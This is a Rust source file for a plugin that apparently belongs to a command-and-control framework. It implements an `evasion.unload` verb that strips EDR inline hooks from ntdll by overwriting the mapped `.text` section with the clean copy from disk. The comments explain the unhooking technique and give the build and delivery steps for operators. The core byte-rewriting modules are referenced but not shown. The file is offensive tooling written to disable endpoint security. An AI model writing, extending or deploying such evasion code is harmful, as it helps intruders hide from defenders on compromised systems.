//! The defense-evasion family's second module (architecture.md Sec
//! 5.4): `evasion.unload`, the module-layer implementation behind the
//! kernel's placeholder verb -- the placeholder carried the contract
//! and the `modifies-defenses` OPSEC flag; this plugin carries the
//! act, and every dispatched restore rides the task audit dispatched
//! actions already enter.
//!
//! The technique is the classic fresh-copy unhook: an EDR's inline
//! hooks live as rewritten bytes in ntdll's mapped `.text`, and the
//! disk copy still carries what the linker wrote. The grammar gives
//! one verb two actions: the bare task is the read -- both images
//! parsed out of their own bytes (headers, section table, the
//! `.text` span), compared byte for byte, the differing count
//! reported -- and `restore` is the write the operator names: page
//! flipped writable, the disk `.text` copied over the mapped one,
//! protection restored, instruction cache flushed. Idempotent by
//! read: a second restore reports `already matches` rather than
//! writing again.
//!
//! The v1.0 scope stays honest on three facts. The rewrite addresses
//! ntdll's whole `.text` alone -- per-DLL and per-function scoping
//! and the KnownDlls section-object path (a fresh copy that never
//! trusts the disk file) are the module's later widening. The
//! compare trusts the disk copy only as far as a build fingerprint
//! (machine, section count, linker timestamp, image size) carries:
//! a disk file the mapped image does not match refuses rather than
//! writing wrong bytes. And a mapped image the loader relocated off
//! its preferred base can carry relocated pointers in `.text` that
//! count as differences a restore should not blindly rewrite -- the
//! classic x64 ntdll is RIP-relative code loaded per-boot, so the
//! ordinary case carries none. Nothing lands on disk: the module
//! reads the disk copy and rewrites pages of this process's own
//! mapping -- copy-on-write makes them private -- and the effect
//! dies with the process. The compare and the copy are byte
//! arithmetic no architecture owns: both Windows architectures
//! carry the verb.
//!
//! Build for a Windows target (`cargo build --release --target
//! x86_64-pc-windows-gnu`), deliver the cdylib's bytes as a
//! `module.load unload` task's content, then task `evasion.unload`
//! like any compiled verb. A non-Windows build compiles for the lane
//! and refuses the verb at run time: the technique has no ntdll to
//! restore there.

mod arguments;
// The fresh-copy edge and the parse it rides are pure and
// host-tested, but only the Windows execution calls them -- the same
// not(windows) allowance the family's other pure halves carry,
// stated once at each module the whole tree of it belongs to.
#[cfg_attr(not(windows), allow(dead_code))]
mod ntdll;
#[cfg_attr(not(windows), allow(dead_code))]
mod pe;

use arguments::Arguments;
use rod_plugin_sdk::{rod_plugin, Plugin, Verb};

// The action the Windows dispatch matches on; off Windows the verb
// refuses before the name is ever spoken, and an unused import would
// be a build warning the lane turns into a failure.
#[cfg(windows)]
use arguments::Action;

pub struct Unload;

impl Plugin for Unload {
    fn name(&self) -> &'static str {
        "unload"
    }

    fn verbs(&self) -> Vec<Verb> {
        vec![Verb::new("evasion.unload", unload)]
    }
}

fn unload(input: &str) -> Result<String, String> {
    let arguments = arguments::parse(input)?;
    execute(&arguments)
}

/// The Windows execution: the read the bare task names, or the write
/// the operator names.
#[cfg(windows)]
fn execute(arguments: &Arguments) -> Result<String, String> {
    match arguments.action {
        Action::List => ntdll::list(),
        Action::Restore => ntdll::restore(),
    }
}

/// The technique has no ntdll off Windows; the manifest's targets
/// keep the module off other loads, and this refusal keeps a stray
/// dispatch honest about why it cannot run.
#[cfg(not(windows))]
fn execute(_arguments: &Arguments) -> Result<String, String> {
    Err(format!(
        "evasion.unload: restoring ntdll's mapped .text is a Windows technique; this \
         build runs on {}",
        std::env::consts::OS
    ))
}

rod_plugin!(Unload);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_bare_task_is_the_read() {
        // The bare task names the read -- the differing-byte count --
        // and the write stays a word the operator speaks.
        #[cfg(windows)]
        {
            let row = unload("").expect("the bare task reads the comparison");
            assert!(row.contains("differ"), "{row}");
        }
        #[cfg(not(windows))]
        {
            let refusal = unload("").expect_err("off Windows the verb refuses");
            assert!(refusal.contains("Windows technique"), "{refusal}");
            assert!(refusal.contains(std::env::consts::OS), "{refusal}");
        }
    }

    #[test]
    fn a_bad_grammar_refuses_before_anything_runs() {
        assert!(unload("unhook").is_err());
        assert!(unload("restore ntdll").is_err());
    }
}
